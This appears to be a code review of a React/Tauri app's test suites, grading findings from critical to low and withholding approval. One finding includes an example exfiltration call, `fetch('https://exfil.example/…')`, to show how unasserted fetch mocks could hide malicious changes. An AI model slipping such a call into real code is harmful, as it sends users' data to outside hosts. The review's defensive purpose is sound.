## CRITICAL

### 1) (Potential) real side effects/network calls in most component tests are unguarded
**Where:** `TeamWorkspace.agents.test.tsx`, `WorkspacePanelHeader.rename.test.tsx`, `WelcomeScreen.profiles.test.tsx`, `App.routing.test.tsx`  
**Issue:** Only `PermissionMode.regression.test.tsx` stubs `global.fetch`. If any of the rendered components (now or in a future refactor) perform `fetch()` on mount (or call Tauri `invoke`, shell openers, filesystem APIs, etc.), these tests could unexpectedly:
- hit real endpoints (SSRF-ish behavior inside CI or developer machines),
- leak environment-dependent credentials via headers,
- become flaky or hang.

**Why this is critical:** this is a classic “tests become an unintended integration runner” problem. A small production change (adding a fetch in `TeamWorkspace` mount) can cause CI to start making outbound calls. Even if it doesn’t leak secrets today, it’s a sharp edge that often becomes a credential exfil vector later.

**Fix:** In a shared test setup, globally stub `fetch` to **fail closed** (throw on any call), and let individual tests explicitly allowlist endpoints they expect. Similarly stub any Tauri/system bridges to throw unless explicitly mocked.

---

## HIGH

### 1) App routing regression suite can be bypassed because it does not test the real `App.tsx` routing/callback wiring
**Where:** `src/__tests__/App.routing.test.tsx`  
**Issue:** The tests validate a local `RoutingHarness` that *copies* the routing callbacks “line-for-line”, rather than importing and exercising the real `App.tsx` (or the actual router integration). This creates a large false-confidence gap:

- Production can regress (wrong `navigate()`, wrong base path for `HashRouter`, wrong stopPropagation placement, wrong fork navigation target, etc.)
- Tests still pass because the harness continues to implement the “correct” behavior regardless of what production does.

**Concrete bypass scenarios (tests stay green while prod breaks):**
- Change `App.tsx` `handleSwitchView` to navigate to `/#/chat` or `/workspaces` mistakenly → harness still uses `setCurrentPath('/' + v)` and passes.
- Remove `e.stopPropagation()` in the real “Add Project” button → harness’s “fixed” button still calls it and passes.
- Change `onForkSession` in production to navigate to `/workspaces` (the regression) → harness still forces `/chat` and passes.

**Fix:** Replace the harness with one of:
- render the real `App` under a `HashRouter`/`MemoryRouter` and assert on `location` + rendered views; or
- spy/mock `react-router`’s `useNavigate` and assert what path it was called with; and
- ensure the “Add Project” button being clicked is the one from production (not a synthetic reproduction).

---

## MEDIUM

### 1) `PermissionMode.regression` stubs `fetch` but never asserts “only expected endpoints were called”
**Where:** `src/components/__tests__/PermissionMode.regression.test.tsx`  
**Issue:** The mock returns `{ ok: false }` for unknown endpoints, but the tests do not fail if the component starts calling unexpected URLs (including absolute URLs). If production accidentally changes an endpoint or starts calling telemetry, the test suite may remain green (depending on component error handling).

**Exploit angle:** a malicious/buggy change could add a `fetch('https://exfil.example/…')`; tests won’t necessarily fail unless the component surfaces the error synchronously.

**Fix:** Add an assertion like:
- `expect(mockFetch.mock.calls.map(([u]) => String(u))).toEqual([...allowlist...])`
and/or make unknown endpoints throw.

---

### 2) Fake timers used globally in `PermissionMode` tests can mask timer-driven failures and leave scheduled work unobserved
**Where:** `PermissionMode.regression.test.tsx` (`vi.useFakeTimers()` in `beforeEach`)  
**Issue:** If `StatusBar` uses polling/intervals/debounces/timeouts for dropdown behavior or diagnostics, fake timers can:
- prevent effects from running (tests pass because nothing happens),
- hide “setInterval leak” issues,
- change ordering and mask real-world crashes.

No test advances timers or asserts timer-driven behavior; no explicit cleanup checks for pending timers.

**Fix:** Avoid fake timers unless needed; otherwise:
- advance timers intentionally (`vi.runOnlyPendingTimers()`),
- assert expected timer-driven fetches happen, and
- verify cleanup (no pending timers after unmount).

---

### 3) Cross-test leakage risk: `vi.clearAllMocks()` does not reset mock implementations
**Where:** `src/components/__tests__/TeamWorkspace.agents.test.tsx`  
**Issue:** `beforeEach(() => vi.clearAllMocks())` clears call history but **keeps** `mockResolvedValue/mockImplementation` from previous tests. Example:
- one test sets `mockOnAddAgent.mockResolvedValue(true)`
- later tests may unknowingly inherit “always true” behavior, hiding regressions.

**Fix:** Use `vi.resetAllMocks()` (or explicitly `.mockReset()` per mock) when you need implementation isolation.

---

### 4) Async assertion gaps / flakiness: remove-agent confirmation test doesn’t await async callback behavior
**Where:** `TeamWorkspace.agents.test.tsx`  
**Issue:** `confirm remove calls onRemoveAgent` asserts immediately after clicks:
```ts
fireEvent.click(confirm)
expect(mockOnRemoveAgent).toHaveBeenCalledWith(...)
```
If the component calls `onRemoveAgent` after a state update/microtask, this becomes timing-dependent.

**Fix:** `await waitFor(() => expect(mockOnRemoveAgent)... )`.

---

### 5) Workspace rename suite heavily mocks dependencies → can miss production integration breaks
**Where:** `WorkspacePanelHeader.rename.test.tsx`  
**Issue:** `useSettings`, clipboard, and IDE opener are mocked. That’s fine for unit tests, but there’s no complementary integration-style assertion ensuring the real `useSettings` shape and IDE configs match the component’s expectations. A production breaking change (settings shape, missing IDE_CONFIGS key, clipboard failure path) won’t be detected.

**Fix:** Add at least one test with a more realistic provider/wiring (or contract tests for the hook/module shapes), plus negative-path tests (rename failure, rejected promise, etc.).

---

### 6) WelcomeScreen tests share module-scope `defaultProps` mocks (state leak risk)
**Where:** `WelcomeScreen.profiles.test.tsx`  
**Issue:** `defaultProps = { onNewChat: vi.fn(), onSubmit: vi.fn() }` is created once and reused. If future tests assert on those calls, you’ll get inter-test coupling.

**Fix:** Create fresh fns per test (`beforeEach` or inline props).

---

## LOW

### 1) `App.routing` “fixed bubbling” test creates a spy but never asserts it was not called
**Where:** `App.routing.test.tsx` (`parentClickSpy`)  
**Issue:** This reduces the value of the test as an “event did not bubble” guarantee. It only asserts `current-path` didn’t change.

**Fix:** `expect(parentClickSpy).not.toHaveBeenCalled()`.

---

### 2) `WelcomeScreen` assertions use `toBeDefined()` rather than DOM matchers
**Where:** `WelcomeScreen.profiles.test.tsx`  
**Issue:** Not wrong (because `getByText` throws), but weaker/less clear than `toBeInTheDocument()`.

---

### 3) `routes` tests don’t cover URL-encoding / special characters in IDs
**Where:** `src/lib/__tests__/routes.test.ts`  
**Issue:** If IDs can contain `/`, `?`, `#`, `%`, spaces, etc., route builders may create ambiguous/broken paths. Tests only cover simple IDs.

**Fix:** Add cases like `routes.chat('a/b')`, `routes.teams('team?x=1')` and assert proper encoding/handling.

---

### 4) `pathToView` “query-like suffix” tests may document an unrealistic contract
**Where:** `routes.test.ts`  
**Issue:** In React Router, `location.pathname` typically excludes `?query`. Testing `'/chat?session=123'` might encourage a tolerant implementation that diverges from the real input domain, and could mask bugs elsewhere (e.g., passing `location.search` incorrectly).

---

### 5) Reliance on `data-testid` everywhere increases brittleness and can hide accessibility regressions
**Where:** multiple files  
**Issue:** Tests pass even if accessible roles/names regress (except where `getByRole` is used). This is a quality + security-hardening angle (a11y regressions often correlate with “click handler on div” bugs like the one you’re regressing).

**Fix:** Prefer `getByRole`/`getByLabelText` for interactive controls wherever possible.

---

CRITICAL: 1  
HIGH: 1  
MEDIUM: 6  
APPROVED: NO
